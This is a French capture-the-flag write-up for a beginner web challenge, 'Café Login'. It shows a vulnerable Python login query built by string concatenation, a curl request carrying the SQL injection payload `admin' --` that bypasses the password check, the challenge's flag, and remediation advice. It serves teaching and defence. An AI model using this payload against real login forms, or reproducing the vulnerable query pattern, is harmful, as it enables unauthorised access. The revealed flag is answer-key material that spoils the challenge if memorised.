# Café Login — Bypass (SQL Injection)

**Catégorie :** Web - SQLi
**Difficulté :** Facile
**Points :** 50

## Objectif

Se connecter en tant qu'administrateur sur le formulaire de connexion du café, sans connaître le mot de passe.

## Vulnérabilité

Le endpoint `/` (méthode POST) construit sa requête SQL par concaténation directe des champs du formulaire, sans requête préparée :

```python
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
```

Le username et le password injectés par l'utilisateur sont insérés tels quels dans la requête SQL, ce qui permet de modifier la logique de la clause `WHERE`.

## Exploitation

**1. Reconnaissance**

Accès au formulaire de login standard :
```bash
curl http://<cible>:5000
```

**2. Injection**

Le payload classique consiste à fermer la chaîne du username avec une quote, puis à commenter le reste de la requête (y compris la vérification du mot de passe) avec `--` :

```bash
curl -X POST http://<cible>:5000 \
  -d "username=admin' --" \
  -d "password=n'importe_quoi"
```

**3. Requête SQL résultante**

```sql
SELECT * FROM users WHERE username='admin' --' AND password='n'importe_quoi'
```

Tout ce qui suit `--` est interprété comme un commentaire SQL. La requête devient effectivement :
```sql
SELECT * FROM users WHERE username='admin'
```

La vérification du mot de passe est totalement contournée.

## Résultat

```
Bienvenue admin (role: admin) — FLAG{sql1_1nj3ct10n_byp4ss}
```

## Flag

```
FLAG{sql1_1nj3ct10n_byp4ss}
```

## Remédiation

- Utiliser des requêtes paramétrées (prepared statements) systématiquement :
  ```python
  cur.execute("SELECT * FROM users WHERE username=? AND password=?", (username, password))
  ```
- Ne jamais construire de requêtes SQL par concaténation de chaînes avec des entrées utilisateur.
- Hasher les mots de passe (bcrypt/argon2) au lieu de les stocker en clair.
